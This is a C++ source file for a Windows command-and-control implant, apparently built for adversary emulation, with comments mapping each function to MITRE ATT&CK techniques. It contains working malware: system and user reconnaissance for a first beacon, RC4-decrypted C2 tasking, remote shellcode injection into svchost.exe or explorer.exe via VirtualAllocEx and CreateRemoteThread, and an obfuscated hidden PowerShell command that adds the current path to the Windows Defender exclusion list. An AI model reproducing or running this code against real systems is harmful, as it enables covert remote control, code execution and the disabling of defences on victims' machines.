#include "Core.h"
#include <EncUtils.h>

// Struct to hold all data pointers and lengths
struct DataPointers {
	int instruction, ptrInstruction, ptrLenLength, ptrLength, ptrData, lenLength, Length;
};
typedef struct DataPointers Struct;

// Find all the ptrs and lengths, and return them for the struct.
Struct findDataPointers(std::string session_id, std::string comms_data)
{	
	int sidLength;
	sidLength = session_id.length();

	Struct s;
	s.ptrInstruction = sidLength;													// pointer to the instruction location after the session id
	s.instruction = hexToDecimal(comms_data.substr(s.ptrInstruction, 2));			// first byte hex representation of the instruction
	s.ptrLenLength = s.ptrInstruction + 2;											// pointer to  the length of the length
	if (s.instruction == 98 || s.instruction == 120 || s.instruction == 0)			// if the instruction doesnt need data pointers return early (0 = bad data, 98 = beacon, 120 = exit)
		return s;
	s.ptrLength = s.ptrLenLength + 2;												// poitner to the actual data length
	if (s.ptrLength > comms_data.length())											// Check to make sure there is actual data after the instruction
		return s;
	s.lenLength = hexToDecimal(comms_data.substr(s.ptrLenLength, 2));				// second byte hex representation of the length of length :]
	s.ptrData = s.ptrLength + s.lenLength * 2;										// added for readability
	s.Length = hexStrToInt(comms_data.substr(s.ptrLength, s.lenLength * 2)) * 2;	// int representation of the data length (multiply times 2 for the hex char count)

	return s;
}

// GetCurrentComputerName()
//      About:
//          Windows API call to get the local computer name
//      Result:
//          Returns the computer name as a string, if the API call fails it returns an unknown host string
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1082 System Information Discovery
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
std::string GetCurrentComputerName() {
    const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
    char buffer[buffer_size];
    DWORD lpnSize = buffer_size;
    if (GetComputerNameA(buffer, &lpnSize) == FALSE) {
        return std::string{ XorStr("Unknown Host")};
    }
    return std::string{ buffer };
};


//  GetCurrentUserName()
//      About:
//          Windows API call to get the current users username
//      Result:
//          Returns current users username as a string
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1033 System Owner/User Discovery
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
std::string GetCurrentUserName() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserName(username, &username_len)) {
        return std::string{ username };
    }
    return std::string{ XorStr("Unknown User") };
}

//  GetPID()
//      About:
//          Windows API call to get the current process id
//      Result:
//          Returns the current process id as a DWORD
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1057 Process Discovery
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
std::string GetPID() {
    DWORD pid = GetCurrentProcessId();
    std::ostringstream spid;
    spid << pid;
    return spid.str();
}

//  GetSysInfo()
//      About:
//          Windows API call to get the local system information
//      Result:
//          Returns the systeminfo struct that is used to fill out pieces of the initial reconnaissance packet
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1082 System Information Discovery
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
SYSTEM_INFO GetSysInfo() {
	SYSTEM_INFO stInfo;
	GetSystemInfo(&stInfo);
	return stInfo;
}
// std::string GetSMSysInfo()
//      About:
//          Collects various pieces of information about the OS build, system architecture for the first packet sent to C2.
//      Result:
//          Returns all of the build and architecture information as a string.
//      MITRE ATT&CK Techniques:
//          T1106 NATIVE API
//          T1082 System Information Discovery
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
std::string GetSMSysInfo() {
	std::string system_info;
	SYSTEM_INFO stInfo = GetSysInfo();
	system_info += intToHexBytes(stInfo.wProcessorArchitecture); 			// processor arch
	if (DEBUG_MSG)
		writeToFile(XorStr("Proc Arch: ") + intToHexBytes(stInfo.wProcessorArchitecture));
	DWORD dwVersion = 0; 
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;
	DWORD dwProductType = 0;
	dwVersion = GetVersion();

	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion))); 	// OS major Version
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
	system_info += intToHexBytes(dwMajorVersion);
	if (DEBUG_MSG)
		writeToFile(XorStr("Version Major: ") + intToHexBytes(dwMajorVersion));

	dwBuild = (DWORD)(HIWORD(dwVersion));					// OS build
	system_info += intToHexBytes(dwBuild);
	if (DEBUG_MSG)
		writeToFile(XorStr("Build: ") + intToHexBytes(dwBuild));

	GetProductInfo(dwMajorVersion, dwMinorVersion, 0, 0, &dwProductType);
	if (std::to_string(dwProductType).length() == 2)		// Make sure we are always using 3 bytes
		system_info += "00";

	system_info += intToHexBytes(dwProductType);			// OS Product Type
	if (DEBUG_MSG)
		writeToFile(XorStr("Product Type: ") + intToHexBytes(dwProductType));

    return system_info;
}

//  IsDebugPrivilege()
//      About:
//         This function checks to see if SE_DEBUG is enabled in the current process.
//      Result:
//          If SE_DEBUG is enabled the function returns true, otherwise returns false
//      MITRE ATT&CK Techniques:
//          T1134 Access Token Manipulation
std::string IsDebugPrivilege(int pid) {
    LUID luid;
    PRIVILEGE_SET privs;
    HANDLE hProcess;
    HANDLE hToken;
	if (pid == 0) {
		hProcess = GetCurrentProcess();
	}
	else {
		// References: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
		// Open the target process w/PROCESS_QUERY_INFORMATION
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
		if (!hProcess) {
			int error = GetLastError();
			writeToFile(XorStr("OpenProcess ERROR: ") + error, "error");
			return "0";
		}
	}
    
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return "0";
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return "0";
    privs.PrivilegeCount = 1;
    privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privs.Privilege[0].Luid = luid;
    privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bResult;
    PrivilegeCheck(hToken, &privs, &bResult);
    std::ostringstream sResult;
    sResult << bResult;
    return sResult.str();
}



//  ExecShellcode(std::string comms_data, Struct dp)
//      About:
//         This function executes the 's' command from the C2 server. The 's' command is used to run shellcode sent from the c2 server.
//      Result:
//          Executes given shellcode
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
int ExecShellcode(std::string comms_data, Struct dp) {
	if (dp.Length > 0) {
		if (DEBUG_MSG)
			writeToFile(XorStr("Executing Shellcode"));
		std::string encoded = hexToString(comms_data.substr(dp.ptrData, dp.Length));
		std::vector<unsigned char> sc = base64_decode(encoded);
		unsigned char* shellcode = sc.data();
		DWORD thread_Id = 0;
		HANDLE hThread = NULL;
		std::string targetProcess = "";
		DWORD targetProcessId = 0;
		if (IsDebugPrivilege(0) == "1") {
			targetProcess = XorStr("svchost.exe");
		}
		else {
			targetProcess = XorStr("explorer.exe");
		}
		if (DEBUG_MSG)
			writeToFile(XorStr("Targeting process: ") + targetProcess);

		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (snapshot == INVALID_HANDLE_VALUE) {
			if (DEBUG_MSG)
				writeToFile(XorStr("Prcoess snapshot failed"));
			return 0;
		}

		if (Process32First(snapshot, &entry)) {
			do {
				if (_stricmp(entry.szExeFile, targetProcess.c_str()) == 0) {
					if (IsDebugPrivilege(entry.th32ProcessID) == "1") {
						targetProcessId = entry.th32ProcessID;
						break;
					}
				}
			} while (Process32Next(snapshot, &entry));
		}

		if (!targetProcessId) {
			writeToFile(XorStr("Switch to self injection Couldnt find target process ID for: ") + targetProcess);
			targetProcessId = GetCurrentProcessId();
		}

		// Open the target process w/necessary permissions to prepare for injection
		if (DEBUG_MSG)
			writeToFile(XorStr("Opening process for ") + targetProcess);
		HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, targetProcessId);
		if (!hProcess) {
			int error = GetLastError();
			writeToFile(XorStr("Open Process Error: ") + error);
			return EXIT_FAILURE;
		}
		writeToFile(XorStr("Open Process Complete"));
		// Allocate some memory buffer in the target process for payload
		LPVOID exec_mem = VirtualAllocEx(hProcess, NULL, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!exec_mem) {
			int error = GetLastError();
			writeToFile(XorStr("Virutal Alloc Error: ") + error);
			return EXIT_FAILURE;
		}
		writeToFile(XorStr("Virtual Alloc Complete"));
		// Copy payload to new memory buffer
		DWORD procmem = WriteProcessMemory(hProcess, exec_mem, sc.data(), sc.size(), NULL);
		if (!procmem) {
			int error = GetLastError();
			writeToFile(XorStr("Write Process Memory Error: ") + error);
			return EXIT_FAILURE;
		}
		writeToFile(XorStr("Write Process Mem complete"));

		// Make the buffer executable
		DWORD oldprotect = 0;
		BOOL vprotect = VirtualProtectEx(hProcess, exec_mem, sc.size(), PAGE_EXECUTE_READ, &oldprotect);
		if (!vprotect) {
			int error = GetLastError();
			writeToFile(XorStr("Virtual Protect Error: ") + error);
			return EXIT_FAILURE;
		}
		writeToFile(XorStr("VProtect Complete"));
		// Launch the payload
		hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, &thread_Id);
		if (!hThread) {
			int error = GetLastError();
			writeToFile(XorStr("Create Remote Thread Error: ") + error);
			return EXIT_FAILURE;
		}
		writeToFile(XorStr("Create Thread complete"));
		return 0;
	}
	return 0;
}


// void defenderWhitelist()
//	About:
//          Either succeeds or fails to add the current path to the defender whitelist.
//      MITRE ATT&CK Techniques:
//          T1562.001 Disabled or Modify Tools
std::string defenderWhitelist() {
	try {
		std::filesystem::path cwd = std::filesystem::current_path();
		char vho[] = "pdxAMPVUeUtGZnFIfjQmelXsqiihDnNfn";
		*vho = RetCharVal(52, 18);
		*(vho + 1) = RetCharVal(60, 45);
		*(vho + 2) = RetCharVal(41, 64);
		*(vho + 3) = RetCharVal(46, 4);
		*(vho + 5) = RetCharVal(23, 94);
		*(vho + 6) = RetCharVal(77, 8);
		*(vho + 7) = 114;
		*(vho + 9) = RetCharVal(26, 81);
		*(vho + 10) = RetCharVal(18, 88);
		*(vho + 11) = 114;
		*(vho + 12) = RetCharVal(53, 53);
		*(vho + 14) = RetCharVal(42, 62);
		*(vho + 15) = RetCharVal(29, 77);
		*(vho + 16) = RetCharVal(22, 15);
		*(vho + 17) = RetCharVal(42, 8);
		*(vho + 18) = RetCharVal(25, 49);
		*(vho + 19) = RetCharVal(68, 57);
		*(vho + 20) = 99;
		*(vho + 22) = RetCharVal(90, 32);
		*(vho + 24) = RetCharVal(108, 2);
		*(vho + 25) = RetCharVal(46, 70);
		*(vho + 26) = RetCharVal(36, 79);
		*(vho + 27) = RetCharVal(80, 5);
		*(vho + 28) = RetCharVal(15, 87);
		*(vho + 29) = RetCharVal(18, 103);
		*(vho + 30) = RetCharVal(21, 88);
		*(vho + 31) = RetCharVal(28, 9);
		*(vho + 32) = RetCharVal(42, 2);
		std::string defender_mp_path = vho;
		defender_mp_path += cwd.generic_string();
		defender_mp_path += "'";
		ExecutePowerShellCmd(defender_mp_path);
		return XorStr("Defender Whitelist function - Success!\n");
	}
	catch (...) {
		return XorStr("Defender Whitelist function - Failed!\n");
	}
}

//  ExecutePowerShellCmd(std::string command)
//      About:
//          Takes a single argument/cmd to execute in powershell
//      Result:
//          spawns a Powershell process with CreateProcess and executes the command
//      MITRE ATT&CK Techniques:
//	    T1106 NATIVE API
//          T1562.001 Disabled or Modify Tools
void ExecutePowerShellCmd(std::string command) {
	char* cmd = new char[command.length() + 1];
	strcpy(cmd, command.c_str());
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	memset(&StartupInfo, 0, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = SW_HIDE;
	ULONG rc;
	std::string str = XorStr("C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe ");
	str += cmd;
	LPSTR s = const_cast<char*>(str.c_str());
	if (DEBUG_MSG)
		writeToFile(XorStr("Powershell Command: ") + str);
	if (!CreateProcess(NULL, s, NULL, NULL, FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo))
	{
		if (DEBUG_MSG)
			writeToFile(XorStr("Error Creating Process: ") + std::to_string(GetLastError()),"error");
	}

	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	if (!GetExitCodeProcess(ProcessInfo.hProcess, &rc))
		rc = 0;

	CloseHandle(ProcessInfo.hThread);
	CloseHandle(ProcessInfo.hProcess);
}

//  HandleC2Sleep(std::string comms_data, int *sleep_time, Struct dp)
//      About:
//         This function executes the 'l' command from the C2 server. The 'l' command is used to adjust the implants sleep time.
//			The time is provided in seconds by the C2 server and converted to ms in the implant. The length of sleep time cannot exceed 255.
//      Result:
//          Adjusts the sleep time to a given value greater than 1.
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
void HandleC2Sleep(std::string comms_data, int* sleep_time, Struct dp) {
	if (dp.Length > 0) {
		if (0 < hexStrToInt(comms_data.substr(dp.ptrData, dp.Length))) {
			*sleep_time = hexStrToInt(comms_data.substr(dp.ptrData, dp.Length)) * 1000;
			if (DEBUG_MSG)
				writeToFile(XorStr("Adjusting C2 Sleep time to ") + *sleep_time);
		}
	}
}

//  HandleC2MessageBox(std::string comms_data, Struct dp)
//      About:
//         This function executes the 'w' command from the C2 server. When requested by C2, the message delivered with the 
//			C2 command is used in a message box that is spawned by the implant.
//			If no message is provided, the mesage box isnt spawned.
//      Result:
//          Spawns a message box with the provided meessaage.
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
void HandleC2MessageBox(std::string comms_data, Struct dp) {
	if (dp.Length > 0) {
		if (DEBUG_MSG)
			writeToFile(XorStr("Popping a message box"));
		MessageBox(NULL, hexToString(comms_data.substr(dp.ptrData, dp.Length)).c_str(), XorStr("WARNING"), MB_OK | MB_ICONEXCLAMATION);
	}
}

// std::string GetSetSessionID(std::string comms_data, std::string* session_id)
//      About:
//         takes the comms_data and session_id as arguments. If session_id length is 0 (not set), then it sets the value using the first 64 byte
//			from comms data. Otherwise it just returns the existing session_id
//      Result:
//          Returns the session_id
std::string GetSetSessionID(std::string comms_data, std::string* session_id) {
	std::string sid = *session_id;

	// If we dont have a session_id set yet, then set it. Otherwise just return the same value.
	if (sid.length() == 0) {
		int sid_length = 64;
		sid = comms_data.substr(0, sid_length);
		if (DEBUG_MSG)
			writeToFile(XorStr("Session ID set to: ") + sid);
	}
	return sid;
}

//  HandleC2Response(std::string comms_data, int *sleep_time, std::string* session_id)
//      About:
//         Takes data that was sent by the C2 server. checks byte 0 for the instruction from C2 and passes to a switch.
//      Result:
//          Executes the expected function passed from C2.
void HandleC2Response(std::string encrypted_comms_data, int* sleep_time, std::string* session_id, CryptoPP::SecByteBlock* rc4Key) {
	std::string comms_data = RC4DecryptString(encrypted_comms_data, *rc4Key);
	Struct dp;
	// Check/Set the session_id
	*session_id = GetSetSessionID(comms_data, session_id);

	// Make sure we have enough data coming from the c2 server
	if (comms_data.length() < 2) {
		if (DEBUG_MSG)
			writeToFile(XorStr("Not enough comms data: ") + comms_data,"error");
		return;
	}
	else {
		dp = findDataPointers(*session_id, comms_data);
	}



	switch (dp.instruction) {
	case 98:                             // 'b' default beacon reply (when no task is queued on C2 side)
		if (DEBUG_MSG)
			writeToFile(XorStr("Beacon Reply"));
		break;
	case 119:							// 'w' Pop a message box
		HandleC2MessageBox(comms_data, dp);
		break;
	case 108:                           // 'l' Adjust C2 sleep
		HandleC2Sleep(comms_data, sleep_time, dp);
		break;
	case 115:                           // 's' Receive/Run shellcode
		ExecShellcode(comms_data, dp);
		break;
	case 120:                           // 'x' Exit the application
		if (DEBUG_MSG)
			writeToFile(XorStr("Exiting the application"));
		exit(0);
		break;
	default:
		if (DEBUG_MSG)
			writeToFile(XorStr("Unknown Instruction provided; Dropping remaining data"),"error");
		break;
	}
}